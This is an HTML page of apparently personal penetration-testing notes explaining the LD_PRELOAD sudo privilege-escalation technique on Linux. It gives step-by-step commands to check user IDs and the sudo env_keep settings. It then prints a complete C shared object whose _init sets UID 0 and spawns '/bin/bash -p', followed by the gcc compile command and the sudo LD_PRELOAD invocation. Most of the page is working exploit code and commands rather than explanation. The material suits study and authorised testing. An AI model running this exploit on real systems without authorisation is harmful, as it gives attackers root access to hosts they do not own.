<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LD_PRELOAD</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>LD_PRELOAD</h1><br/><strong><h3>How it works LD_PRELOAD privilege escalation</h3></strong><br />• LD_ PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. This  shared object will be loaded before any others. <br />   ◇ Point 4<br />• By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded <br />   ◇ Point 2 and 3<br />• sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option<br />   ◇ We can check it at point 1<br />• LD_PRELOAD will not work if the <span style="color:#0ee491;">real user ID</span> is different from the <span style="color:#ff0000;">effective user ID</span>.<br />   ◇ Point 0<br /><br /><strong><h3>ACTION:</h3></strong><br />0. Check if the current process <span style="color:#0ee491;">real user ID</span> is different from the <span style="color:#ff0000;">effective user ID</span>.<br />   ◇ To check current process: <span style="color:#0ee491;">real ID</span>, <span style="color:#ff0000;">effective ID</span>, <span style="color:#00dbff;">saved ID</span>, file system ID (how we have seen in <a href="-Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Permissions_in_Linux.html">Permissions in Linux</a>):<br />    <div class="codebox"><pre>target@debian:~$ cat /proc/$$/status | grep &quot;[UG]id&quot;</pre></div><br />        <a href=""><img src="images/1299-1.png" alt="images/1299-1.png" /></a><br />1. Check if <strong>env_keep</strong> option includes the LD_PRELOAD environment variable<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> -l</pre></div><br />    <a href=""><img src="images/1299-2.png" alt="images/1299-2.png" /></a><br />2. Create a file (preload.c) with the following contents:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ vim preload.c<br />    <span style="color:#0088ff;font-weight:400">#i --&gt; insert text</span><br />    <span style="color:#0088ff;font-weight:400">#Esc --&gt; to finish to insert the text</span><br />    <span style="color:#0088ff;font-weight:400">#:wq --&gt; write and quit</span></pre></div><br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;sys/types.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdlib.h&gt;</span><br />void <span style="color:#ffdd00;font-weight:400">_init()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    unsetenv<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;LD_PRELOAD&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />    setresuid<span style="color:#ff9d00;font-weight:700">(</span>0,0,0<span style="color:#ff9d00;font-weight:700">);</span>           <br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/bash -p&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />    It should spawn a shell when loaded<br />3. Compile preload.c to preload.so<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">gcc</span> -fPIC -shared -nostartfiles -o <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>preload.so preload.c</pre></div><br />	<a href=""><img src="images/1299-3.png" alt="images/1299-3.png" /></a><br />    if it give an error should anyway created it<br />4 . Run <span style="color:#ff8700;">any allowed program using sudo</span> , while setting the LD_PRELOAD environment variable to the full path of the preload.so file:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> -l</pre></div><br />    <a href=""><img src="images/1299-4.png" alt="images/1299-4.png" /></a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> <span style="color:#7f0044;font-weight:400">LD_PRELOAD</span>=<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>preload.so &lt;program_specified_in_sudo-l&gt;</pre></div><br />    <span style="color:#a5452a;">example</span><br />    <a href=""><img src="images/1299-5.png" alt="images/1299-5.png" /></a><br />    <span style="color:#a5452a;">example</span><br />    <a href=""><img src="images/1299-6.png" alt="images/1299-6.png" /></a><br />    <span style="color:#a5452a;">example</span><br />    <a href=""><img src="images/1299-7.png" alt="images/1299-7.png" /></a><br /><br /><br /></div>
</body>
</html>
